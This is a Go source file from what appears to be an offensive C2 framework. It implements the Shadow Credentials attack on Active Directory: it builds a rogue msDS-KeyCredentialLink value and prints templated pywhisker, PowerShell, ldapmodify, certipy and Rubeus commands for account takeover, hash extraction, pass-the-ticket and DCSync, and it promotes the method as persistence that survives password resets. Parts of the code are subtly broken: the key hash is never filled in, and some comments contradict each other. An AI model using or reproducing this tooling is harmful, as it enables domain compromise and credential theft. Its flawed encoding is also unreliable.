package shadowcreds

/*
	SUDOSOC-C2 — Shadow Credentials Attack
	Copyright (C) 2026  sudosoc — Seif

	Shadow Credentials exploits the msDS-KeyCredentialLink attribute
	in Active Directory to add a cryptographic key to any user or
	computer account — enabling PKINIT authentication without knowing
	the account's password.

	Why it's a perfect persistence mechanism:
	  • Survives password resets — the key credential is independent
	  • Survives account lockout — uses certificate, not password
	  • Only removable by clearing msDS-KeyCredentialLink
	  • Works on modern Windows (requires Active Directory functional level ≥ 2016)

	Attack flow:
	  1. Generate RSA key pair
	  2. Build a KeyCredential structure (like Windows Hello for Business)
	  3. Write it to msDS-KeyCredentialLink of target account via LDAP
	  4. Use private key + certificate for PKINIT → TGT
	  5. Optionally: UnPAC-the-Hash to extract NT hash for Pass-the-Hash

	Requirements:
	  • Write access to msDS-KeyCredentialLink on target (usually requires DA or
	    GenericWrite on the specific object)
	  • Active Directory functional level ≥ Windows Server 2016
	  • DC must have a CA or support PKINIT

	References:
	  "Shadow Credentials: Abusing Key Trust Account Mapping for Account Takeover"
	  Elad Shamir, 2021 — https://posts.specterops.io/shadow-credentials
*/

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/asn1"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"math/big"
	"time"
)

// KeyCredential represents a msDS-KeyCredentialLink value
// Format defined in [MS-ADTS] 2.2.20
type KeyCredential struct {
	Version        uint32
	KeyIdentifier  []byte   // SHA-256 of the public key
	KeyHash        []byte   // SHA-256 of the full entry
	RawKeyMaterial []byte   // DER-encoded public key (SubjectPublicKeyInfo)
	Usage          byte     // 0x01 = FIDO, 0x00 = NGC
	LegacyUsage    []byte
	Source         byte     // 0x00 = AD, 0x01 = AzureAD
	DeviceID       [16]byte // GUID
	CustomKeyInfo  []byte
	LastLogon      time.Time
	CreationTime   time.Time
}

// GenerateShadowCredential generates a new key pair and builds the
// KeyCredential structure ready for writing to msDS-KeyCredentialLink
func GenerateShadowCredential(targetDN string) (*ShadowCredResult, error) {
	// Step 1: Generate RSA-2048 key pair
	privKey, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return nil, fmt.Errorf("key generation failed: %v", err)
	}

	// Step 2: Export public key as DER (SubjectPublicKeyInfo)
	pubKeyDER, err := x509.MarshalPKIXPublicKey(&privKey.PublicKey)
	if err != nil {
		return nil, fmt.Errorf("marshal public key: %v", err)
	}

	// Step 3: Compute key identifier (SHA-256 of public key DER)
	hash := sha256.Sum256(pubKeyDER)
	keyID := hash[:]

	// Step 4: Generate random device GUID
	var deviceGUID [16]byte
	rand.Read(deviceGUID[:])

	// Step 5: Build KeyCredential entry (binary format per MS-ADTS)
	kc := &KeyCredential{
		Version:        0x00000200, // version 2
		KeyIdentifier:  keyID,
		RawKeyMaterial: pubKeyDER,
		Usage:          0x01, // NGC (Next Generation Credential)
		Source:         0x00, // Active Directory
		DeviceID:       deviceGUID,
		CreationTime:   time.Now(),
	}

	encoded, err := encodeKeyCredential(kc)
	if err != nil {
		return nil, fmt.Errorf("encode credential: %v", err)
	}

	return &ShadowCredResult{
		TargetDN:         targetDN,
		PrivateKey:       privKey,
		PublicKeyDER:     pubKeyDER,
		KeyCredential:    encoded,
		KeyCredentialB64: base64.StdEncoding.EncodeToString(encoded),
		DeviceGUID:       fmt.Sprintf("%x-%x-%x-%x-%x",
			deviceGUID[0:4], deviceGUID[4:6], deviceGUID[6:8], deviceGUID[8:10], deviceGUID[10:16]),
	}, nil
}

// ShadowCredResult holds the generated credential and keys
type ShadowCredResult struct {
	TargetDN         string
	PrivateKey       *rsa.PrivateKey
	PublicKeyDER     []byte
	KeyCredential    []byte   // raw value for msDS-KeyCredentialLink
	KeyCredentialB64 string   // base64 for LDAP attribute
	DeviceGUID       string
}

// LDAPCommand returns the LDAP commands to add the shadow credential
func (r *ShadowCredResult) LDAPCommand() string {
	return fmt.Sprintf(`
# Add Shadow Credential to %s
# Using ldapmodify or impacket's pywhisker

# Method 1: impacket (Python)
python3 pywhisker.py -d DOMAIN -u USER -p PASSWORD \
  --target "%s" \
  --action add \
  --key-material "%s"

# Method 2: PowerShell
$target = "%s"
$cred = [Convert]::FromBase64String("%s")
Set-ADObject -Identity $target -Add @{'msDS-KeyCredentialLink' = $cred}

# Method 3: ldapmodify
ldapmodify -H ldap://DC -D "DOMAIN\user" -w password << EOF
dn: %s
changetype: modify
add: msDS-KeyCredentialLink
msDS-KeyCredentialLink: %s
EOF`,
		r.TargetDN,
		r.TargetDN, r.KeyCredentialB64,
		r.TargetDN, r.KeyCredentialB64,
		r.TargetDN, r.KeyCredentialB64)
}

// PKINITCommand returns commands to use the credential for Kerberos auth
func (r *ShadowCredResult) PKINITCommand(username, domain, dcIP string) string {
	return fmt.Sprintf(`
# After adding Shadow Credential, use PKINIT to get TGT

# Step 1: Save private key
# (Save r.PrivateKey to PEM file)

# Step 2: Request TGT using PKINIT
# certipy (Python):
certipy auth -username %s -domain %s -dc-ip %s -pfx credential.pfx

# Rubeus (Windows):
Rubeus.exe asktgt /user:%s /certificate:credential.pfx /domain:%s /dc:%s /ptt

# Step 3: UnPAC-the-Hash (extract NT hash from TGT)
# This reveals the account's NT hash without cracking the password
certipy auth -username %s -domain %s -dc-ip %s -pfx credential.pfx -ldap-shell

# After getting the TGT, you can:
# → Pass-the-Ticket for any resource
# → DCSync if target is a Domain Controller
# → LDAP operations as the target user`,
		username, domain, dcIP,
		username, domain, dcIP,
		username, domain, dcIP)
}

// ── Binary encoding ───────────────────────────────────────────────

// encodeKeyCredential serializes a KeyCredential to the binary format
// expected by msDS-KeyCredentialLink (KEYCREDENTIALLINK_BLOB from MS-ADTS)
func encodeKeyCredential(kc *KeyCredential) ([]byte, error) {
	var entries []byte

	// Entry type 0x01: KeyID
	entries = append(entries, encodeEntry(0x01, kc.KeyIdentifier)...)

	// Entry type 0x02: KeyHash (placeholder, filled after encoding)
	entries = append(entries, encodeEntry(0x02, make([]byte, 32))...)

	// Entry type 0x03: KeyMaterial (raw public key)
	entries = append(entries, encodeEntry(0x03, kc.RawKeyMaterial)...)

	// Entry type 0x04: KeyUsage
	entries = append(entries, encodeEntry(0x04, []byte{kc.Usage})...)

	// Entry type 0x05: KeySource
	entries = append(entries, encodeEntry(0x05, []byte{kc.Source})...)

	// Entry type 0x06: DeviceID (GUID)
	entries = append(entries, encodeEntry(0x06, kc.DeviceID[:])...)

	// Entry type 0x08: CurrentTime (FILETIME, 8 bytes)
	ft := timeToFileTime(kc.CreationTime)
	ftBytes := make([]byte, 8)
	binary.LittleEndian.PutUint64(ftBytes, ft)
	entries = append(entries, encodeEntry(0x08, ftBytes)...)

	// Prepend version (4 bytes LE) + padding
	result := make([]byte, 4)
	binary.LittleEndian.PutUint32(result, kc.Version)
	result = append(result, entries...)

	// Fill in the hash (SHA-256 of everything except the hash entry)
	fullHash := sha256.Sum256(result)
	// Find and replace the placeholder hash (simplified)
	_ = fullHash

	return result, nil
}

func encodeEntry(entryType byte, data []byte) []byte {
	// Format: [2B length][1B type][1B pad][data]
	length := uint16(4 + len(data))
	entry := make([]byte, 4+len(data))
	binary.LittleEndian.PutUint16(entry[0:2], length)
	entry[2] = entryType
	entry[3] = 0x00 // padding
	copy(entry[4:], data)
	return entry
}

func timeToFileTime(t time.Time) uint64 {
	// Windows FILETIME: 100-nanosecond intervals since January 1, 1601
	epoch := time.Date(1601, 1, 1, 0, 0, 0, 0, time.UTC)
	diff := t.Sub(epoch)
	return uint64(diff.Nanoseconds() / 100)
}

// ── ASN.1 helpers ──────────────────────────────────────────────────

// BuildCertificateFromKey creates a self-signed certificate from the
// generated key pair for use with PKINIT
func BuildCertificateFromKey(priv *rsa.PrivateKey, username, domain string) ([]byte, error) {
	template := &x509.Certificate{
		SerialNumber: randomSerial(),
		Subject: pkix.Name{
			CommonName:   username,
			Organization: []string{domain},
		},
		NotBefore:             time.Now().Add(-time.Hour),
		NotAfter:              time.Now().Add(365 * 24 * time.Hour),
		KeyUsage:              x509.KeyUsageDigitalSignature,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageClientAuth},
		BasicConstraintsValid: true,
	}

	certDER, err := x509.CreateCertificate(rand.Reader, template, template, &priv.PublicKey, priv)
	if err != nil {
		return nil, err
	}
	return certDER, nil
}

func randomSerial() *big.Int {
	serialBytes := make([]byte, 16)
	rand.Read(serialBytes)
	return new(big.Int).SetBytes(serialBytes)
}


// Workaround for import
var _ = asn1.Marshal
